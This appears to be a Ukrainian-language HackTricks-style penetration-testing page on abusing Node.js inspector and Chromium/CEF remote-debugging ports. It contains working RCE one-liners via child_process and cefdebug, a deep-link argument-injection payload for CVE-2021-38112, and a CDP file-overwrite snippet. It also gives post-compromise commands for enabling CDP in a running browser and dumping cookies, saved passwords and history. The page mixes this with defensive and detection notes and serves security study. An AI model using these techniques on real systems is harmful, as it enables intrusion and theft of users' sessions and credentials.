# Зловживання налагодженням Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Історичні практичні приклади включають покроковий розбір Multimaster і атаку на налагоджувач Visual Studio Code CVE-2019-1414; використовуйте їх як контекст для конкретних версій, а не вважайте, що в кожній сучасній цілі на Electron або Chromium доступні ті самі примітиви.<sup>[[1]](#references)[[3]](#references)</sup>

## Основна інформація

[З документації](https://nodejs.org/learn/getting-started/debugging): якщо запустити процес Node.js із параметром `--inspect`, він почне очікувати на підключення клієнта для налагодження. **За замовчуванням** він слухатиме на адресі хоста та порту **`127.0.0.1:9229`**. Кожному процесу також призначається **унікальний** **UUID**.<sup>[[4]](#references)</sup>

Щоб підключитися, клієнти Inspector мають знати й вказати адресу хоста, порт і UUID. Повна URL-адреса матиме такий вигляд: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Оскільки **налагоджувач має повний доступ до середовища виконання Node.js**, зловмисник, який може підключитися до цього порту, може отримати змогу виконувати довільний код від імені процесу Node.js (**потенційне підвищення привілеїв**).<sup>[[4]](#references)</sup>

Запустити Inspector можна кількома способами:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Коли ви запускаєте процес, який налагоджується, з’явиться щось на кшталт:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Процеси на основі **CEF** (**Chromium Embedded Framework**) можуть відкривати налагоджувач за допомогою `--remote-debugging-port=9222`. Це відкриває доступ до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), а не через інспектор Node.js, тому корисні навантаження на основі `process` у Node.js за замовчуванням не підходять.<sup>[[2]](#references)[[5]](#references)</sup>

Коли ви запускаєте браузер у режимі налагодження, з’явиться щось на кшталт цього:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Перелік і керування кінцевою точкою CDP

HTTP-ендпоїнти виявлення розрізняють WebSocket браузера та WebSocket окремих цілей (вкладка, worker, розширення тощо). Запитуйте `/json/version`, щоб отримати кінцеву точку браузера, а `/json/list` — щоб отримати цілі; значення `webSocketDebuggerUrl` у відповіді можна використовувати для безпосереднього керування через повідомлення, подібні до JSON-RPC, у CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Наприклад, підключіться за допомогою `websocat "$BROWSER_WS"` і надішліть `{"id":1,"method":"Target.getTargets"}` або `{"id":2,"method":"Storage.getCookies"}`. Для цілі сторінки (`websocat "$PAGE_WS"`) `Runtime.evaluate` виконується в цьому рендерері, а `Page.captureScreenshot` повертає скриншот у кодуванні base64. `document.cookie` не може показати cookies з атрибутом `HttpOnly`, тоді як `Storage.getCookies` запитує сховище cookies браузера.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Браузери, WebSockets і same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Вебсайти, відкриті у веббраузері, можуть надсилати запити WebSocket і HTTP відповідно до моделі безпеки браузера. **Початкове HTTP-з’єднання** необхідне, щоб **отримати унікальний ідентифікатор сеансу debugger**. **Same-origin policy** **не дозволяє** вебсайтам встановлювати **це HTTP-з’єднання**. Для додаткового захисту від [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js перевіряє, чи в заголовках **'Host'** для з’єднання вказано **IP-адресу** або саме **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Цей **захід безпеки запобігає використанню inspector** для запуску коду **лише надсиланням HTTP-запиту** (що можна було б зробити, використавши вразливість SSRF).<sup>[[4]](#references)</sup>

### Запуск inspector у запущених процесах

Ви можете надіслати сигнал **SIGUSR1** запущеному процесу nodejs, щоб він **запустив inspector** на стандартному порту. Однак зауважте, що для цього потрібні достатні привілеї. Це може надати вам **привілейований доступ до інформації всередині процесу**, але не є прямим підвищенням привілеїв.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Це корисно в контейнерах, оскільки **зупинити процес і запустити новий** з `--inspect` **неможливо**: **контейнер** буде **зупинено** разом із процесом.<sup>[[6]](#references)</sup>

### Підключення до inspector/debugger

Щоб підключитися до браузера на базі **Chromium**, можна відкрити URL `chrome://inspect` або `edge://inspect` для Chrome або Edge відповідно. Натиснувши кнопку Configure, переконайтеся, що **цільовий хост і порт** указано правильно. На зображенні показано приклад Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Після цього з’явиться URL для доступу до debugger, наприклад ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Підключення до inspector/debugger: щоб підключитися до браузера на базі Chromium, ...](<../../images/image (674).png>)

За допомогою **командного рядка** можна підключитися до debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Інструмент [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) дає змогу **знаходити інспектори**, запущені локально, і **впроваджувати в них код**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Зверніть увагу: **експлойти NodeJS RCE не працюватимуть**, якщо підключитися до браузера через [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (потрібно перевірити API, щоб знайти цікаві способи його використання).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE у налагоджувачі/інспекторі NodeJS

> [!TIP]
> Якщо ви шукаєте, як отримати [**RCE через XSS в Electron, перегляньте цю сторінку.**](../../desktop-application-security/electron-desktop-apps/index.html)

Ось кілька поширених способів отримати **RCE**, якщо ви можете **підключитися** до інспектора Node, наприклад, використовуючи щось на кшталт наведеного нижче (схоже, це **не працюватиме при підключенні через Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads протоколу Chrome DevTools

Переглянути API можна тут: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
У цьому розділі я просто наведу цікаві приклади використання цього протоколу для експлуатації вразливостей.

### Обмеження профілю за замовчуванням у Chrome 136+

Починаючи з **Chrome 136**, Chrome ігнорує `--remote-debugging-port` і `--remote-debugging-pipe`, якщо вони використовуються зі **стандартним каталогом даних Chrome**. Цей перемикач потрібно поєднувати з нестандартним `--user-data-dir`, окремий ключ шифрування якого та ізольований стан браузера не дають простій техніці з прапорцями отримати доступ до звичайного профілю користувача з автентифікованими сеансами. Не слід вважати, що це обмеження Chrome поширюється на старіші збірки Chrome, Chrome for Testing, застосунки Electron/CEF або інші похідні від Chromium без додаткової перевірки.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Отже, сам факт, що поточний процес Chrome запущено лише з параметром `--remote-debugging-port`, **не доводить**, що CDP став активним. Перевірте наявність listener і `/json/version`, а також визначте, який саме профіль його використовує.<sup>[[14]](#references)</sup>

### Ін’єкція параметрів через Deep Links

У [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) дослідники Rhino Security виявили, що застосунок на базі CEF **зареєстрував власний UR**I у системі (workspaces://index.html), який отримував повний URI, а потім **запускав застосунок на базі CEF**n із конфігурацією, частково сформованою з цього URI.<sup>[[8]](#references)</sup>

З’ясувалося, що параметри URI декодувалися з URL-кодування та використовувалися для запуску базового застосунку CEF, що давало змогу користувачу **впровадити** прапорець **`--gpu-launcher`** у **командний рядок** і виконувати довільні дії.<sup>[[8]](#references)</sup>

Отже, payload на кшталт:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Виконає calc.exe.<sup>[[8]](#references)</sup>

### Перезапис файлів

Змініть папку, у якій **зберігатимуться завантажені файли**, і завантажте файл, щоб **перезаписати** часто використовуваний **вихідний код** програми своїм **шкідливим кодом**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE та ексфільтрація через WebDriver

STAR Labs показала, що відкриті сервіси WebDriver/CDP можуть надавати змогу читати довільні файли та виконувати код (RCE); у деяких конфігураціях ланцюжок експлойту можна завершити за допомогою DNS rebinding.<sup>[[9]](#references)</sup>

Сервіс WebDriver у ChromeDriver відрізняється від Chrome DevTools/CDP. Його capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) задає виконуваний файл браузера, який запускається для нової сесії. Якщо непривілейований користувач може отримати доступ до сервісу ChromeDriver, запущеного від root, і створити сесію, указавши контрольований ним шлях до виконуваного файлу, запуск може перетнути межу привілеїв сервісу. Порожня відповідь `/sessions` не доводить, що створити нові сесії неможливо. Перш ніж робити висновок, що цей шлях придатний до використання, перевірте власника процесу, фактичну доступність слухача, авторизацію сесій, доступ до виконуваного файлу та обмеження середовища; самої назви процесу чи звичного порту недостатньо. [Рекомендації Google з безпеки](https://developer.chrome.com/docs/chromedriver/security-considerations) радять запускати ChromeDriver від непривілейованого облікового запису. Пасивне перерахування не повинно створювати сесію WebDriver.

Інші історичні випадки, пов’язані з автоматизацією браузера та безпекою Chromium, описані у звіті Counter WebDriver і проблемах Project Zero 773, 1742 та 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Увімкнення CDP у запущеному процесі Chromium

Обмеження Chrome для профілю за замовчуванням блокує лише активацію через командний рядок. Маючи достатній доступ рівня того самого користувача для керування процесом браузера, оригінальний [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) і [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) для Cobalt Strike викликають неекспортовану функцію Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` усередині вже запущеного `chrome.exe` або `msedge.exe`. Тому кінцева точка належить реальному профілю та зберігає його вкладки, розширення, файли cookie й автентифікований стан.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Для звичайних процесів x64 Chrome/Edge BOF знаходить вікно браузера та завантажену `chrome.dll`/`msedge.dll`, сканує віддалений PE на наявність сигнатур із масками, виділяє місце для заглушок і блоку контексту, тимчасово підміняє процедуру вікна та виконує фінальний виклик у **потоці інтерфейсу користувача** браузера. Відповідні вхідні дані часу виконання: `StartRemoteDebuggingServer`, `operator new` Chromium, `TCPServerSocketFactory::CreateForHttpServer` і vtable фабрики. Виконання припиняється, якщо хоча б одна обов’язкова сигнатура має неунікальний збіг.<sup>[[15]](#references)[[16]](#references)</sup>

BOF приймає режим браузера та необов’язковий порт. Після цього його допоміжний скрипт може перевірити кінцеву точку та зібрати файли cookie; `chrome-iso` — це окремий шлях для обходу межі Windows Process Isolation у Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Шлях `chrome-iso` використовує лише дескриптори із правами, обмеженими запитом інформації, до ізольованого процесу. Він знаходить встановлений `chrome.dll`, розмір PE-образу якого збігається з розміром образу в запущеному процесі, отримує символи з цього локального образу й використовує диспетчеризацію Chromium `WindowImpl`, синхронний `WM_COPYDATA` та наявний хук User32 у завантаженому образі, щоб звернутися до потоку UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Це техніка **маніпуляції процесом браузера після компрометації**, а не обхід автентифікації в мережі. Вона залежить від збірки, оскільки відповідні символи C++ не експортуються й можуть змінитися після оновлення браузера.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Оновлення сигнатур після оновлення браузера

Використовуйте точну версію `chrome.dll` або `msedge.dll`, встановлену на цільовій системі, та відповідний їй PDB. `symchk.exe` з Windows SDK завантажує символи; потім скрипти репозиторію знаходять `StartRemoteDebuggingServer`, визначають входи алокатора й фабрики сокетів або перевіряють усі сигнатури, вбудовані в BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Результат із нульовою або кількома знахідками не можна замінювати довільною адресою. Якщо відомий шаблон `operator new` або `CreateForHttpServer` змінився настільки, що на його основі не вдається створити нову маску, скористайтеся `pe_signature_finder.py` разом із PDB, щоб дослідити цей символ і визначити послідовність байтів, унікальну в цільовому модулі.<sup>[[16]](#references)[[18]](#references)</sup>

#### Вилучення даних з автентифікованого браузера за допомогою CDP Toolkit

Ця техніка не розшифровує App-Bound Encryption (ABE) офлайн і не усуває прив’язку до пристрою. Натомість вона використовує легітимний браузер як **decryption oracle та проксі для автентифікованої взаємодії**: `Storage.getCookies` запитує в запущеного браузера дані зі сховища cookie, а робочі процеси навігації та screencast залишають запити, сховище, корпоративну автентифікацію та поведінку, прив’язану до пристрою, у межах наявного браузера жертви.<sup>[[17]](#references)[[18]](#references)</sup>

Після маршрутизації loopback-слухача CDP через pivot оператора [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) може перерахувати та зібрати типові артефакти.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` і `tabs screenshot` — це здебільшого обгортки для `/json/version`, списку цілей, `Storage.getCookies` і `Page.captureScreenshot`. Для роботи з історією, закладками, розширеннями та метаданими паролів натомість потрібна тимчасова ціль `chrome://`/`edge://` WebUI: toolkit очікує, поки інтерфейс відобразиться, перевіряє його модель або DOM, збирає результат і закриває ціль.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` іде далі: відкриває справжнє джерело збереженого входу, фокусує поле облікових даних, вибирає нативну підказку автозаповнення за допомогою подій введення CDP і зчитує заповнені значення. Джерело/порт/шлях мають максимально точно відповідати realm збереженого пароля; видимий режим — надійний варіант за замовчуванням, оскільки спливне вікно підказки є нативним елементом інтерфейсу браузера.<sup>[[17]](#references)[[18]](#references)</sup>

Для взаємодії в реальному часі `browser-takeover screencast` транслює кадри та надсилає введення справжній цілі (зокрема у фоновому режимі або режимі поза екраном). Натомість `browser-takeover proxy` локально приймає HTTP і HTTPS `CONNECT` та виконує upstream-запити через приховані цілі Chrome, використовуючи фонові вкладки, якщо приховані цілі недоступні; це зберігає мережевий контекст/контекст автентифікації жертви, але менш точно відтворює складні клієнтські застосунки, оскільки браузер оператора відображає отриманий вміст.<sup>[[17]](#references)[[18]](#references)</sup>

Для виявлення не покладайтеся лише на телеметрію командного рядка `--remote-debugging-*`: також зіставляйте незвичні дескриптори й операції з пам’яттю процесів браузера (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, створення потоків), DLL injection і неочікувані loopback-сокети прослуховування, власниками яких є Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

У реальному середовищі й **після компрометації** ПК користувача, який використовує браузер на базі Chromium, історично застосовували такий метод: перезапускали браузер із увімкненим налагодженням і перенаправляли loopback-порт. Це може відкрити стан браузера жертви у продуктах/збірках, які досі приймають вибраний профіль, але Chrome 136+ не дозволить цього для стандартного каталогу даних.<sup>[[7]](#references)[[14]](#references)</sup>

Оригінальну команду перезапуску наведено нижче для старіших/версійно-залежних цілей. Друга команда — підтримуваний спосіб для поточного Chrome, але вона створює ізольований профіль замість повторного відкриття звичайного автентифікованого стану жертви.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Для специфічних для macOS технік повторного запуску Chromium, розширень і CDP див. [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Інструмент для перевірки та експлуатації налагоджувача CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Віддалене виконання коду у Visual Studio Code через налагоджувач Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Посібник із налагодження Node.js — Початок роботи](https://nodejs.org/learn/getting-started/debugging)
- [5] [Протокол Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Звіт corCTF 2021 — saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Зловживання функцією налагодження Chrome для віддаленого спостереження за сеансами перегляду та керування ними](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Віддалене виконання коду в AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Ти зі мною розмовляєш? — RCE у WebDriver через DNS rebinding і CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Протидія WebDriver — від бота до RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Проблема 773 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Проблема 1742 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Проблема 1944 у Google Project Zero (трекер помилок Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Зміни перемикачів віддаленого налагодження для підвищення безпеки — Chrome для розробників](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Впровадження CDP у запущений браузер Edge: детальний огляд інструментування браузера під час виконання](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps — Повернення Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
